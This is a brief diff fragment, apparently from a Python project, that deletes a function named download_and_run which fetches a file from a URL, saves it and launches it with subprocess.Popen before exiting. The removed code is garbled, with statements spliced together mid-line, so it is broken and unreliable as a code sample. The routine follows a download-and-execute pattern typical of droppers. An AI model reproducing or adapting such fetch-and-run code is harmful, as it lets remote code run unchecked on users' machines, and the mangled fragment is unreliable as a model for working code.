@@ -1,10 +1,1 @@
 
-def download_and_run(download_url):s.get(download_url, stream=True)
-            for chunk in res.iter_content(chunk_size=1024):
-                if chunk:
-                    f.write(chunk)
-
-        subprocess.Popen([file_name])
-        sys.exit()
-
-    except Exception as e:n{e}")
